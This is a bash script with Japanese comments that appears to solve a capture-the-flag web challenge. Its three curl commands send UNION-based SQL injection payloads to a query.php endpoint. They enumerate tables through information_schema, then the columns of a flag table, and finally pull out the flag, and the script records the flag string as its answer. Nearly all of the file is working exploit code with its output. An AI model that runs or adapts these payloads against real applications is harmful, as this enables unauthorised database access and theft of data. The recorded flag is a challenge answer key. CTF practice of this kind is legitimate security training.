#!/bin/bash

# main.jsを読むとquery.phpにvalue(検索文字列)とoption(検索項目)を渡して検索結果を取得している
# 色々試すとquery.phpのvalueにSQLInjectionがある

# テーブル一覧取得
curl -X POST https://awebc19.archiso.dev/problems/dolls_data_1/query.php -d "value=1' UNION ALL SELECT table_name, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 FROM information_schema.tables #&option=id" | jq

# FLAG Table
#    {
#      "id": "dolls_data_1_flag_b3f4befc",
#      "rarity": "2",
#      "type": "3",
#      "name": "4"
#    },

# FLAGテーブルのカラム取得
curl -X POST https://awebc19.archiso.dev/problems/dolls_data_1/query.php -d "value=1' UNION ALL SELECT column_name , 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 FROM information_schema.columns WHERE table_name = 'dolls_data_1_flag_b3f4befc' #&option=id" | jq

# Kar98列がある
#
#   {
#      "id": "kar98k",
#      "rarity": "2",
#      "type": "3",
#      "name": "4"
#   }


# Kar98列を表示させる。これがフラグ
# FLAG: WebC{D0lls_front1ine_i5_v3ry_nic3_g4me!_Y0u_mu5t_p1ay_i7_n0w!_d10e093d}
curl -X POST https://awebc19.archiso.dev/problems/dolls_data_1/query.php -d "value=1' UNION ALL SELECT Kar98k, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 FROM dolls_data_1_flag_b3f4befc #&option=id" | jq | grep --color=auto "WebC{.*}"
